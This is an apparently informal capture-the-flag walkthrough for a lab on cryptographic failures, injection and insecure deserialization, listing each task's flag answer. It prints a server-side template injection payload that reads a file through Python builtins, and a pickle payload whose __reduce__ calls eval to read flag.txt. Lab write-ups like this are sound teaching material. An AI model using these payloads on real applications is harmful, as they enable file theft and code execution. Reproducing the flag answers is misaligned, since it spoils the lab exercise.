# Insecure Data Handling

## task 1 Introduction

I'm ready!

* No answer needed


## task 2 A04: Cryptographic Failures

Decrypt the encrypted notes. One of them will contain a flag value. What is it?

* i just try KEY1 but you can Brute force the key with Burpsuite
* the answer is THM{WEAK_CRYPTO_FLAG}


## task 3 A05: Injection

* tape this request
```
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```
* the answer is THM{SSTI_FLAG_OBTAINED}


## task 4 A08: Software or Data Integrity Failures

Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application.
 What are the contents of flag.txt?

 * nano payload.py
```
import pickle
import base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```
* chmod +x payload.py
* python3 payload.py
* put the hash in the web for the flag
* the answer is THM{INSECURE_DESERIALIZATION}


### end
